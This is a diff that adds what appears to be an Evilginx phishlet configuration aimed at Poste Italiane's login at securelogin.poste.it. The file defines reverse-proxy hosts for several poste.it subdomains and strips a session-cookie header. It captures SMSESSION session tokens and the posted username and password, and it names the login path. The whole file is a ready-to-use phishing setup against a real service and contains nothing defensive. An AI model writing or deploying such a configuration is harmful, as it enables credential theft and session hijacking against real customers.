@@ -1,0 +1,108 @@
+author: "@francescocee"
+min_ver: "3.3.0"
+
+proxy_hosts:
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "securelogin.poste.it",
+      session: true,
+      is_landing: true,
+    }
+  - {
+      phish_sub: "",
+      orig_sub: "",
+      domain: "poste.it",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "poste.it",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "idp-poste",
+      orig_sub: "idp-poste",
+      domain: "poste.it",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "pa",
+      orig_sub: "pa",
+      domain: "poste.it",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "cdn",
+      orig_sub: "cdn",
+      domain: "poste.it",
+      session: true,
+      is_landing: false,
+    }
+  - {
+      phish_sub: "cdn-cgi",
+      orig_sub: "cdn-cgi",
+      domain: "poste.it",
+      session: true,
+      is_landing: false,
+    }
+
+sub_filters:
+  # Esempio: rimuovi header che bloccano la sessione
+  - {
+      domain: "securelogin.poste.it",
+      orig_sub: "",
+      search: "Set-Cookie: SMSESSION=",
+      replace: "",
+      triggers_on: "response",
+      mimes: ["text/html"],
+    }
+
+auth_tokens:
+  - domain: ".poste.it"
+    keys: ["SMSESSION", "*regexp"]
+  - domain: "securelogin.poste.it"
+    keys: ["SMSESSION", "*regexp"]
+  - domain: "www.poste.it"
+    keys: ["SMSESSION", "*regexp"]
+  - domain: "idp-poste.poste.it"
+    keys: ["SMSESSION", "*regexp"]
+  - domain: "pa.poste.it"
+    keys: ["SMSESSION", "*regexp"]
+  - domain: "cdn.poste.it"
+    keys: ["SMSESSION", "*regexp"]
+  - domain: "cdn-cgi.poste.it"
+    keys: ["SMSESSION", "*regexp"]
+
+credentials:
+  username:
+    key: "username"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+
+auth_urls:
+  - "/jod-fcc/fcc-authentication.html"
+  - "/jod-fcc/"
+  - "/my-poste/dashboard"
+  - "/myposte-app/"
+  - "/myposte-app/js/"
+  - "/myposte-app/js/module/"
+  - "/myposte-app/js/app/"
+  - "/widgets/"
+  - "/assets-wcs/"
+  - "/risorse_dt/"
+  - "/appuntamento/"
+  - "/"
+
+login:
+  domain: "securelogin.poste.it"
+  path: "/jod-fcc/fcc-authentication.html"
